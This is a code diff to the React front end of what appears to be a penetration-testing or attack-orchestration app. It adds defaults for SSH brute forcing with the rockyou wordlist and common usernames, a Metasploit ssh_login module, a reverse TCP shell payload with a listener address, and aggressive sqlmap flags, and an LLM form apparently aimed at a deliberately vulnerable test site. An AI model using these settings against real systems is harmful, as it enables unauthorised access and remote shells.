@@ -71,6 +71,13 @@ export default function App() {
     dry_run: true,
     service: "ssh",
     port: 22,
+    dictionary: "/opt/wordlists/rockyou.txt",
+    usernames: "root,admin,ubuntu",
+    concurrency: 4,
+    metasploitModule: "auxiliary/scanner/ssh/ssh_login",
+    metasploitPayload: "linux/x64/shell_reverse_tcp",
+    metasploitOptions: "LHOST=10.10.14.2;LPORT=4444",
+    sqlmapFlags: "--risk=3 --level=5 --batch",
   });
   const [llmForm, setLlmForm] = useState<LlmFormState>({
     url: "http://testphp.vulnweb.com",
@@ -160,6 +167,13 @@ export default function App() {
           parameters: {
             service: attackForm.service,
             port: Number(attackForm.port),
+            dictionary: attackForm.dictionary,
+            usernames: attackForm.usernames,
+            concurrency: Number(attackForm.concurrency),
+            metasploit_module: attackForm.metasploitModule,
+            metasploit_payload: attackForm.metasploitPayload,
+            metasploit_options: attackForm.metasploitOptions,
+            sqlmap_flags: attackForm.sqlmapFlags,
           },
         }),
       });
